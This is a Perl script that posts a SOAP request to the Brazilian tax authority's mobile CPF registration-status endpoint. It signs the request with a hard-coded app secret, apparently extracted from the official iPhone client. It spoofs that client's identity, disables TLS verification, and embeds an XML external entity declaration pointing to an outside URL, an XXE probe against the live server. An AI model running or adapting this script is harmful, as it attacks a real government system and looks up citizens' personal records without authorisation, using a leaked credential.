#!/usr/bin/perl -w

use strict;
use LWP::UserAgent;
use IO::Socket::SSL qw//;
use Digest::HMAC_SHA1 qw/hmac_sha1_hex/;


my $cpf = ''; # cpf aki
my $pw = 'Sup3RbP4ssCr1t0grPhABr4sil';

my $ua = LWP::UserAgent->new(
	agent => 'Mozilla/5.0 (iPhone; CPU iPhone OS 5_0 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9A334 Safari/7534.48.3',
	'ssl_opts' => {
		SSL_verify_mode => IO::Socket::SSL::SSL_VERIFY_NONE,
		SSL_hostname => '',
		verify_hostname => 0
	}
);

my $token = hmac_sha1_hex($cpf, $pw);

my $xml = "<?xml version=\"1.0\" encoding=\"utf-8\" standalone=\"yes\" ?>
<!DOCTYPE a [<!ENTITY e SYSTEM 'http://google.com/'> ]>
<soap:Envelope xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" >
	<soap:Header>
		<token>$token</token>
		<aplicativo>Pessoa Física</aplicativo>
		<plataforma>iPhone OS</plataforma>
		<versao>8.3</versao>
		<dispositivo>iPhone</dispositivo>
		<versao_app>3.0</versao_app>
	</soap:Header>
	<soap:Body>
		<soap:obtemSituacaoCadastral xmlns:soap=\"http://soap.ws.cpf.service.mobile.rfb.serpro.gov.br/\">
			
			<cpf>$cpf</cpf>
		</soap:obtemSituacaoCadastral>
	</soap:Body></soap:Envelope>";

my $request = $ua->post(
	'https://movel01.receita.fazenda.gov.br/servicos-rfb/ConsultaCPF',
	Content => $xml,
	'Content_Type' => 'application/x-www-form-urlencoded'
);

print $request->content;
print "\n";
